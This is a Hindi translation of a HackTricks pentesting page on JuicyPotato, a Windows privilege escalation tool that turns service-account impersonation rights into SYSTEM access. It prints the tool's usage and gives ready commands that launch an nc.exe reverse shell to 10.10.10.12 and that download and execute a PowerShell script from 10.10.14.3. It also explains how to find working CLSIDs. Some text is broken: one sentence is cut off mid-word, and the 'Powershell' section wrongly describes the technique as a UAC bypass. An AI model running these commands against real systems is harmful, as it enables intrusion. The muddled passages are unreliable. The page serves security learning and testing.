# जूसीपोटैटो

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित करना** चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की अनुमति** चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स को** [**हैकट्रिक्स रेपो**](https://github.com/carlospolop/hacktricks) **और** [**हैकट्रिक्स-क्लाउड रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके अपने हैकिंग ट्रिक्स साझा करें।**

</details>

{% hint style="warning" %}
**जूसीपोटैटो** Windows Server 2019 और Windows 10 बिल्ड 1809 के बाद काम नहीं करता है। हालांकि, [**प्रिंटस्पूफर**](https://github.com/itm4n/PrintSpoofer)**,** [**रोगपोटैटो**](https://github.com/antonioCoco/RoguePotato)**,** [**शार्पईएफएसपोटैटो**](https://github.com/bugch3ck/SharpEfsPotato) का उपयोग करके **एक ही विशेषाधिकारों का लाभ उठाया जा सकता है और `NT AUTHORITY\SYSTEM`** स्तर का पहुंच प्राप्त किया जा सकता है। _**जांचें:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## जूसीपोटैटो (स्वर्णिम विशेषाधिकारों का दुरुपयोग) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_एक चीनी रूपांतरित संस्करण_ [_रॉटेनपोटैटोएनजी_](https://github.com/breenmachine/RottenPotatoNG)_ के साथ, थोड़ा जूस, अर्थात **एक लोकल प्रिविलेज एस्केलेशन टूल, विंडोज सर्विस अकाउंट से NT AUTHORITY\SYSTEM तक**_

#### आप जूसीपोटैटो को यहां से डाउनलोड कर सकते हैं [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### सारांश <a href="#summary" id="summary"></a>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) और इसके [वेरिएंट्स](https://github.com/decoder-it/lonelypotato) ने [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [सेवा](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) पर आधारित विशेषाधिकार उन्नयन श्रृंखला का लाभ उठाया है जिसमें `127.0.0.1:6666` पर MiTM सुनने वाला लिस्टनर होता है और जब आपके पास `SeImpersonate` या `SeAssignPrimaryToken` विशेषाधिकार होते हैं। विंडोज बिल्ड समीक्षा के दौरान हमें एक सेटअप मिला जहां `BITS` को जानबूझकर अक्षम किया गया था और पोर्ट `6666` लिया गया था।

हमने [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) को वेपनाइज़ करने का फैसला किया: **जूसीपोटैटो को नमस्ते कहें**।

> सिद्धांत के लिए, देखें [रॉटेन पोटैटो - सेवा अकाउंट से सिस्टम तक विशेषाधिकार उन्नयन](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) और लिंक और संदर्भों की श्रृंखला का पालन करें।

हमने यह खोजा कि, `BITS` के अलावा भी कई COM सर्वर हैं ज
### उपयोग <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### अंतिम विचार <a href="#final-thoughts" id="final-thoughts"></a>

यदि उपयोगकर्ता के पास `SeImpersonate` या `SeAssignPrimaryToken` अधिकार हैं तो आप **SYSTEM** हो जाएंगे।

इन सभी COM सर्वरों के दुरुपयोग को रोकना लगभग असंभव है। आप `DCOMCNFG` के माध्यम से इन ऑब्जेक्ट्स की अनुमतियों को संशोधित करने के बारे में सोच सकते हैं, लेकिन शुभकामनाएं, यह कठिन होगा।

वास्तविक समाधान है कि `* SERVICE` खातों के तहत चलने वाले संवेदनशील खातों और एप्लिकेशनों की सुरक्षा करें। `DCOM` को रोकने से निश्चित रूप से इस उत्पीड़न को रोका जा सकता है, लेकिन इसका आधारभूत ऑपरेटिंग सिस्टम पर गंभीर प्रभाव हो सकता है।

स्रोत: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## उदाहरण

नोट: प्रयास करने के लिए CLSID की सूची के लिए [इस पृष्ठ](https://ohpe.it/juicy-potato/CLSID/) पर जाएं।

### एक nc.exe रिवर्स शेल प्राप्त करें
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell रिव

Powershell रिव एक उपयोगी तकनीक है जो विंडोज प्रणाली में स्थानीय प्रिविलेज उन्नयन करने के लिए उपयोग की जाती है। यह तकनीक ज्यादातर उन स्थितियों में काम करती है जहां UAC (उपयोगकर्ता खाता नियंत्रण) सक्षम होता है और एडमिनिस्ट्रेटर अधिकार वाले उपयोगकर्ता उपयोगकर्ता द्वारा चलाए जा रहे होते हैं।

यह तकनीक एक अद्यतित आवेदन का उपयोग करती है जिसे "JuicyPotato" कहा जाता है। इसका उपयोग करके, हम एक अद्यतित COM ऑब्जेक्ट को बनाते हैं जिसे विंडोज सिस्टम को एक उच्चतम स्तर की अनुमति देने के लिए प्रेरित किया जा सकता है। इसके बाद, हम इस COM ऑब्जेक्ट को उपयोग करके एक अनुमति उच्चतम स्तर के प्रक्रिया को चला सकते हैं और इसे उच्चतम स्तर के उपयोगकर्ता के रूप में निष्पादित कर सकते हैं।

यह तकनीक विंडोज 7, 8 और 10 पर काम करती है और इसका उपयोग करके हम स्थानीय प्रिविलेज को उन्नत कर सकते हैं।
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### एक नया CMD लॉन्च करें (यदि आपके पास RDP एक्सेस है)

![](<../../.gitbook/assets/image (37).png>)

## CLSID समस्याएं

अक्सर, JuicyPotato द्वारा उपयोग किए जाने वाले डिफ़ॉल्ट CLSID **काम नहीं करता** है और एक्सप्लॉइट विफल हो जाता है। आमतौर पर, एक **काम करने वाले CLSID** के लिए कई प्रयासों की आवश्यकता होती है। एक विशिष्ट ऑपरेटिंग सिस्टम के लिए ट्राई करने के लिए CLSID की सूची प्राप्त करने के लिए, आपको इस पेज पर जाना चाहिए:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **CLSIDs की जांच करें**

सबसे पहले, आपको juicypotato.exe के अलावा कुछ executables की आवश्यकता होगी।

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) को डाउनलोड करें और अपने PS सत्र में लोड करें, और [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) को डाउनलोड और एक्सीक्यूट करें। यह स्क्रिप्ट एक संभावित CLSID की सूची बनाएगा जिसे टेस्ट करने के लिए।

फिर [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat) को डाउनलोड करें (CLSID सूची और juicypotato executable के पथ को बदलें) और इसे एक्सीक्यूट करें। यह हर CLSID की कोशिश करना शुरू करेगा, और **जब पोर्ट नंबर बदल जाएगा, तो इसका मतलब होगा कि CLSID काम कर गया है**।

**पैरामीटर -c का उपयोग करके** काम करने वाले CLSIDs **की जांच करें**

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की आवश्यकता है**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह देखें
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** अनुसरण करें।
* **अपने हैकिंग ट्रिक्स को** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके अपना योगदान दें।**

</details>
